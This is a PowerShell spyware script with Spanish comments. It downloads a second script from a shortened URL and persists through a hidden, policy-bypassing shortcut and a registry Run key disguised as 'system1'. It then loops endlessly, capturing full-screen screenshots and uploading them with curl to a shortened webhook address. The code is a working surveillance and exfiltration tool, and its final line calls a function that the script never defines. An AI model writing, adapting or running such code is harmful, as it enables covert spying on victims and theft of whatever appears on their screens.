$hookurl = "https://bit.ly/web_chupacabras"  # URL del webhook
$scriptUrl = "https://bit.ly/Screen_dc"  # URL del script
$seconds = 30 # Intervalo entre capturas de pantalla
$a = 2 # Cantidad de capturas de pantalla por iteración

# Función para descargar el script desde una URL
function DescargarScript {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
}

# Verificar si el archivo del script existe, si no, descargarlo
$scriptPath = "$env:temp\script.ps1"
if (-not (Test-Path $scriptPath)) {
    DescargarScript
}

# Crear acceso directo para ejecutar en el inicio de Windows
$shortcutPath = "$env:temp\system1.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
$shortcut.Save()

# Agregar entrada al Registro de Windows para ejecutar al iniciar sesión
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "system1"
if (-not (Get-ItemProperty -Path $registryPath -Name $scriptName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $registryPath -Name $scriptName -Value $shortcutPath
}

# Iniciar bucle de captura y envío de imágenes
While ($true){
    For ($i = 0; $i -lt $a; $i++){
        $Filett = "$env:temp\SC_$i.png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width
        $Height = $Screen.Height
        $Left = $Screen.Left
        $Top = $Screen.Top
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    Start-Sleep 1
    For ($i = 0; $i -lt $a; $i++){
        curl.exe -F "file$i=@$env:temp\SC_$i.png" $hookurl
        Start-Sleep 1
        Remove-Item -Path "$env:temp\SC_$i.png" -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep $seconds
}

# Ejecuta el ciclo de captura y envío de manera automática
EjecutarCiclo
